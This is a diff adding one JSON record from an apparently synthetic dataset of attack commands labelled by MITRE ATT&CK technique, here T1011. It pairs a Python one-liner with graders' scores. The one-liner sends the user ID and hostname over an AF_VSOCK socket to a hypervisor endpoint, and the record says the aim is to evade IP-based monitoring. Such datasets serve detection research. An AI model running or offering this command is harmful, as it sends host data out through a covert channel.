@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,os,platform; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((4, 53211)); payload=('uid='+str(os.getuid())+' host='+platform.node()+'\\n').encode(); s.sendall(payload); s.close()\"",
+  "explanation": "Transmits minimal host and user identifiers via AF_VSOCK to CID 4 on a high, uncommon port, avoiding IP-based channels per T1011.",
+  "rationale_steps": [
+    "Pick vsock to traverse a non-IP transport medium.",
+    "Connect to CID 4 using an uncommon port (53211).",
+    "Prepare a compact identification payload and send.",
+    "Close the socket to end the exchange quickly."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-aa9e2bae",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is well-formed with balanced quotes/parentheses, valid semicolon-separated statements, and correct use of socket APIs.",
+        "semantic_score": 4,
+        "semantic_justification": "It exfiltrates identifiers via AF_VSOCK (a non-IP channel) aligning with the intent to avoid standard network monitoring, though it relies on a vsock-capable Linux/virtualization environment and the T1011 mapping is somewhat indirect.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-09-30T23:48:28.711350Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced parentheses, proper string encoding, valid socket API calls, and correct command separators throughout.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly uses AF_VSOCK (a hypervisor/VM communication channel distinct from IP networking) to exfiltrate host and user identifiers to CID 4, which aligns well with T1011's concept of using an alternative network medium, though AF_VSOCK is a VM-to-hypervisor channel rather than a traditional alternative network medium like cellular or Bluetooth, making it a creative but slightly non-canonical implementation of the technique.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T21:51:30.768475Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is perfectly formed, uses correct socket constants for Linux, and maintains balanced quoting and parentheses.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly utilizes AF_VSOCK to communicate over the hypervisor's backplane, effectively bypassing standard IP-based network monitoring as described in MITRE ATT&CK T1011.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T21:51:32.303000Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
